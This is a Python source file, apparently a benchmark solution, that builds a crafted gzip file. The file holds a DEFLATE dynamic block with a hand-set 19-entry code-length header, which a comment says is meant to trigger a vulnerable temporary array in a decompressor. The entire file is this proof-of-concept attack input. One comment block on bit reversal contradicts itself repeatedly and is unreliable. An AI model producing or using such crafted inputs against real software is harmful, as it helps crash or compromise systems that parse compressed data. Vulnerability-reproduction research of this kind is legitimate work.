import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper: bit writer for DEFLATE (LSB-first within each byte)
        class BitWriter:
            def __init__(self):
                self.buf = bytearray()
                self.acc = 0
                self.nbits = 0

            def write_bits(self, value: int, n: int):
                v = value
                bits_left = n
                while bits_left > 0:
                    take = min(8 - self.nbits, bits_left)
                    self.acc |= (v & ((1 << take) - 1)) << self.nbits
                    self.nbits += take
                    v >>= take
                    bits_left -= take
                    if self.nbits == 8:
                        self.buf.append(self.acc & 0xFF)
                        self.acc = 0
                        self.nbits = 0

            def flush(self):
                if self.nbits > 0:
                    self.buf.append(self.acc & 0xFF)
                    self.acc = 0
                    self.nbits = 0

            def get_bytes(self) -> bytes:
                self.flush()
                return bytes(self.buf)

        # Build canonical Huffman codes from lengths
        def build_canonical_codes(lengths):
            max_bits = 0
            for l in lengths:
                if l > max_bits:
                    max_bits = l
            if max_bits == 0:
                return {}
            bl_count = [0] * (max_bits + 1)
            for l in lengths:
                if l > 0:
                    bl_count[l] += 1
            next_code = [0] * (max_bits + 1)
            code = 0
            for bits in range(1, max_bits + 1):
                code = (code + bl_count[bits - 1]) << 1
                next_code[bits] = code
            codes = {}
            for sym, l in enumerate(lengths):
                if l != 0:
                    c = next_code[l]
                    next_code[l] += 1
                    # Store reversed bits for LSB-first writing
                    rev = 0
                    for i in range(l):
                        if (c >> i) & 1:
                            rev |= 1 << (l - 1 - i)
                    # For LSB-first writer, we can instead just use c, but since we wrote 'write_bits' expecting LSB-first,
                    # we need to reverse the bits to match canonical MSB-first. The above 'rev' is MSB-order.
                    # However for LSB-first write_bits, we should pass 'c' directly (since 'c' increments as MSB codes).
                    # Correct approach: compute MSB code 'c', then reverse it to LSB-first order:
                    # But our reversal produced 'rev' as MSB bitstring reversed; To write LSB-first, we use 'c' itself.
                    # Let's recompute properly: we need the bitstring as it should appear MSB-first; 'c' is MSB-first value of length l.
                    # For write_bits (LSB-first), we must reverse 'c' bits.
                    # So built 'c', now reverse l bits:
                    r = 0
                    cc = c
                    for _ in range(l):
                        r = (r << 1) | (cc & 1)
                        cc >>= 1
                    codes[sym] = (r, l)
            return codes

        # Construct DEFLATE dynamic block that only emits End-of-block (256)
        # with dynamic header having HCLEN=19 to trigger the vulnerable temp arrays.
        bw = BitWriter()
        # BFINAL=1, BTYPE=2 (dynamic)
        bw.write_bits(1, 1)
        bw.write_bits(2, 2)
        # HLIT=0 (257 codes), HDIST=0 (1 code), HCLEN=15 (19 code length codes)
        bw.write_bits(0, 5)
        bw.write_bits(0, 5)
        bw.write_bits(15, 4)

        # Code length code lengths (19 entries) in order:
        order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]
        # We define a code-length Huffman with only two symbols: 1 and 18, both length 1.
        cl_lengths = [0]*19
        cl_lengths[1] = 1
        cl_lengths[18] = 1
        # Write the 3-bit lengths in the specified order
        for sym in order:
            bw.write_bits(cl_lengths[sym], 3)

        # Build code-length Huffman codes
        cl_codes = build_canonical_codes(cl_lengths)
        # Tokens for encoding literal/length and distance code lengths:
        # LIT/LEN: 257 codes; set indices 0..255 -> 0, index 256 -> 1
        # We encode 256 zeros using two 18 runs: 138 and 118 zeros.
        # Then encode '1' for index 256, and '1' for the single distance code.
        # Symbol 18 uses 7 extra bits; symbol 1 has no extra bits.
        # First 18: repeat 138 zeros (extra = 127)
        code_18, len_18 = cl_codes[18]
        code_1, len_1 = cl_codes[1]
        bw.write_bits(code_18, len_18)
        bw.write_bits(127, 7)
        # Second 18: repeat 118 zeros (extra = 107)
        bw.write_bits(code_18, len_18)
        bw.write_bits(107, 7)
        # '1' for literal/length symbol 256
        bw.write_bits(code_1, len_1)
        # '1' for distance symbol 0
        bw.write_bits(code_1, len_1)

        # Now encode the single End-of-block symbol using the constructed LIT/LEN codes:
        # LIT/LEN lengths derived from above sequence: only symbol 256 has length 1.
        litlen_lengths = [0]*257
        litlen_lengths[256] = 1
        litlen_codes = build_canonical_codes(litlen_lengths)
        code_256, len_256 = litlen_codes[256]
        # Write End-of-block
        bw.write_bits(code_256, len_256)

        deflate_data = bw.get_bytes()

        # Build GZIP container
        header = bytearray()
        header += b'\x1f\x8b'          # ID1, ID2
        header += b'\x08'              # CM = deflate
        header += b'\x00'              # FLG
        header += b'\x00\x00\x00\x00'  # MTIME
        header += b'\x00'              # XFL
        header += b'\xff'              # OS (255 = unknown)

        # Uncompressed data is empty
        crc = binascii.crc32(b'') & 0xffffffff
        isize = 0
        footer = struct.pack('<II', crc, isize)

        return bytes(header) + deflate_data + footer
